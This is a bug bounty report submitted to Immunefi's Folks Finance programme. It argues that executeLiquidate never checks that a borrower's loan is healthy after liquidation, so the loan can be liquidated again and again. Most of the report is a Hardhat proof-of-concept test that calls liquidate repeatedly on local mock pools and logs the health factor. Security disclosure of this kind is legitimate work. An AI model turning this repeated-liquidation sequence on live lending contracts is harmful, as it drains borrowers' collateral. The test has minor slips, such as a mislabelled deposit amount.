# Boost \_ Folks Finance 33935 - \[Smart Contract - Insight] Liquidations dont ensure the violator loan

## Liquidations don't ensure the violator loan becomes healthy afterwards

Submitted on Fri Aug 02 2024 02:04:59 GMT-0400 (Atlantic Standard Time) by @jovi for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33935

Report type: Smart Contract

Report severity: Insight

Target: <https://immunefi.com/>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

## Liquidations don't ensure the violator loan becomes healthy afterwards

### Brief/Intro

In liquidations, the borrower repays his debt with some of his collateral plus a bonus amount as incentives to the liquidator and as fees to the protocol. The executeLiquidate function, however, does not ensure the liquidation makes the borrower's position healthy, leaving the position exposed to repeated liquidations.

### Vulnerability Details

The executeLiquidate function at the LoanManagerLogic contract coordinates the main logic behind liquidations. During its final checks, it ensures the liquidator's loan is over-collateralized after taking over part of the validator loan:

```solidity
// check liquidator loan in over-collateralized after taking over part of the violator loan
        loansParams.checkLiquidatorLoan(userLoans, loanTypes, pools, params.oracleManager);
```

However, the violator loan not only has lost some borrowed amount, but also some collateral amount. That means the violator's position is not necessarily healthier than it was before as ought to be checked if it is over-collateralized as well after the liquidation happens.

### Impact Details

Liquidators may liquidate a violator's loan to states that are less healthy than before and start a loop of liquidations till all the violator loan is drained.

### References

[folks-finance-xchain-contracts/contracts/hub/logic/LoanManagerLogic.sol at main · Folks-Finance/folks-finance-xchain-contracts (github.com)](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/logic/LoanManagerLogic.sol#L498)

### Proof of concept

### Proof of concept

Paste the following test inside the Liquidate tests at the LoanManager.test.ts file:

```typescript
it("Should liquidate variable borrow multiple times while seizing borrow and collateral j-01", async () => {
      const {
        hub,
        loanManager,
        loanManagerAddress,
        oracleManager,
        pools,
        loanId: violatorLoanId,
        accountId: violatorAccountId,
        loanTypeId,
        depositFAmount,
        borrowAmount,
        usdcVariableInterestIndex: oldVariableInterestIndex,
      } = await loadFixture(depositEtherAndVariableBorrowUSDCFixture);

      // create liquidator loan
      const liquidatorLoanId = getRandomBytes(BYTES32_LENGTH);
      const liquidatorAccountId = getAccountIdBytes("LIQUIDATOR_ACCOUNT_ID");
      const liquidatorLoanName = getRandomBytes(BYTES32_LENGTH);
      await loanManager
        .connect(hub)
        .createUserLoan(liquidatorLoanId, liquidatorAccountId, loanTypeId, liquidatorLoanName);

      // deposit USDC into liquidator loan
      const liquidatorDepositAmount = BigInt(1000e6); // 10,000 USDC
      const liquidatorDepositFAmount = liquidatorDepositAmount;
      const liquidatorDepositInterestIndex = BigInt(1e18);
      const usdcPrice = BigInt(1e18);
      await pools.USDC.pool.setDepositPoolParams({
        fAmount: liquidatorDepositFAmount,
        depositInterestIndex: liquidatorDepositInterestIndex,
        priceFeed: { price: usdcPrice, decimals: pools.USDC.tokenDecimals },
      });
      await loanManager
        .connect(hub)
        .deposit(liquidatorLoanId, liquidatorAccountId, pools.USDC.poolId, liquidatorDepositAmount);

      // prepare liquidation
      const ethNodeOutputData = getNodeOutputData(BigInt(1000e18));
      await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData);

      // calculate interest
      const variableInterestIndex = BigInt(1.1e18);
      const stableInterestRate = BigInt(0.1e18);
      await pools.USDC.pool.setBorrowPoolParams({ variableInterestIndex, stableInterestRate });
      await pools.USDC.pool.setUpdatedVariableBorrowInterestIndex(variableInterestIndex);

      // Violator:
      // Collateral 1 ETH = $1,000
      // Borrow 1,000 USDC = $1,000

      // Liquidator:
      // Collateral 10,000 USDC = $10,000
      // Borrow $0

      const repayAmount = BigInt(100e6); // 100 USDC
      const collateralFAmount = convToCollateralFAmount(
        repayAmount,
        ethNodeOutputData.price,
        pools.ETH.tokenDecimals,
        usdcPrice,
        pools.USDC.tokenDecimals,
        BigInt(1e18)
      );
      const seizeCollateralAmount = convToSeizedCollateralAmount(
        repayAmount,
        ethNodeOutputData.price,
        pools.ETH.tokenDecimals,
        usdcPrice,
        pools.USDC.tokenDecimals,
        pools.USDC.liquidationBonus
      );
      const seizeCollateralFAmount = toFAmount(seizeCollateralAmount, BigInt(1e18));
      const reserveCollateralFAmount = calcReserveCol(
        seizeCollateralFAmount,
        collateralFAmount,
        pools.ETH.liquidationFee
      );

      // liquidate
      const minSeizedAmount = BigInt(0);
      const liquidate = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

      let borrowHealthFactor; 
      let violatorLoanNew;
      const liquidate2 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});


        const liquidate3 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});

        const liquidate5 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});

        const liquidate6 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});

        const liquidate7 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});

        const liquidate8 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});

        const liquidate9 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});

        const liquidate10 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        // violator collateral / violator borrow balance
        borrowHealthFactor = violatorLoanNew[4][0][0] / violatorLoanNew[5][0][1];
        console.log({borrowHealthFactor});

        const liquidate11 = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );

        violatorLoanNew = await loanManager.getUserLoan(violatorLoanId);
        console.log("\n Take a look at the violator loan after all the liquidations with the all the collateral removed \n");
        console.log({violatorLoanNew});

    });
```

Run the test with the following command:

```shell
npx hardhat test --grep "Should liquidate variable borrow multiple times while seizing borrow and collateral j-01"
```
